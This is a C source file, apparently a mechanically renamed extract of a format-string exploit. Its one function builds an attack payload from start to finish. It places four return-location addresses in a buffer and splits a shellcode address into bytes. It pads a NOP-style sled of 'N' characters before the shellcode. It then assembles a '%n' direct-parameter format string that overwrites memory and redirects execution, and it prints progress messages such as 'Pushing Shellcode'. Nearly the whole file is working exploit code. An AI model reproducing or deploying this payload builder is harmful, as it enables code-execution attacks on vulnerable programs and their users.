#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int u_long ;

/* Variables and functions */
 int /*<<< orphan*/  FUNC0 (int /*<<< orphan*/ ,char*,...) ; 
 int /*<<< orphan*/  FUNC1 (char*,int /*<<< orphan*/ ,int) ; 
 unsigned char* shellcode ; 
 int /*<<< orphan*/  FUNC2 (scalar_t__,int,char*,unsigned char*,scalar_t__,int,int,int,int,int,int,int,int,int,int,int,unsigned char*) ; 
 int /*<<< orphan*/  stdout ; 
 int FUNC3 (unsigned char*) ; 
 int x0x_test1 ; 
 int x0x_test2 ; 
 int x0x_test3 ; 
 scalar_t__ x82x82x82 ; 

int FUNC4(u_long retloc,u_long shaddr,int flag)
{
    unsigned char x82x82[x0x_test2];
    unsigned char x0x[x0x_test3];

    int bx82,cx82,ex82,fx82,gx82,hx82;
    int add1,add2,add3,add4;
    bx82=cx82=ex82=fx82=gx82=hx82=0;
    add1=add2=add3=add4=0;

    FUNC1((char *)x82x82x82,0,x0x_test1);
    FUNC1((char *)x82x82,0,x0x_test2);
    FUNC1((char *)x0x,0,x0x_test3);

    *(long *)&x0x[0]=0x82828282;
    *(long *)&x0x[4]=retloc+0;

    *(long *)&x0x[8]=0x82828282;
    *(long *)&x0x[12]=retloc+1;

    *(long *)&x0x[16]=0x82828282;
    *(long *)&x0x[20]=retloc+2;

    *(long *)&x0x[24]=0x82828282;
    *(long *)&x0x[28]=retloc+3;
    /* real */
    ex82=(shaddr>>24)&0xff;
    fx82=(shaddr>>16)&0xff;
    gx82=(shaddr>> 8)&0xff;
    hx82=(shaddr>> 0)&0xff;
    /* test */
    add1=(shaddr>>24)&0xff;
    add2=(shaddr>>16)&0xff;
    add3=(shaddr>> 8)&0xff;
    add4=(shaddr>> 0)&0xff;

    if((add4-40)<10)
		 hx82+=0x100;
    if((add3-add4)<10)
		 gx82+=0x100;
    if((add2-add3)<10)
		 fx82+=0x100;

    for(bx82=0;bx82<0x140-FUNC3(shellcode);bx82++)
		 x82x82[bx82]='N'; /* CodeRed?! Whoou ... */
    for(cx82=0;cx82<FUNC3(shellcode);cx82++)
		 x82x82[bx82++]=shellcode[cx82];

    FUNC0(stdout," [2] Pushing Shellcode.\n");
    FUNC0(stdout," [-] Shellcode address: %d\n",shaddr);

    FUNC2(x82x82x82,x0x_test1,
		     "@%s" /* <- point */
		     "%%%d$%ux%%%d$n%%%d$%ux%%%d$n" /* $-flag */
		     "%%%d$%ux%%%d$n%%%d$%ux%%%d$n" /* format string */
		     "%s\n", /* code */
		     x0x,
		     (flag+0),hx82-40,(flag+1),(flag+2),
		     gx82-add4,(flag+3),(flag+4),fx82-add3,
		     (flag+5),(flag+6),0x100+ex82-add2,
		     (flag+7),x82x82);

    /* funny :-) */

}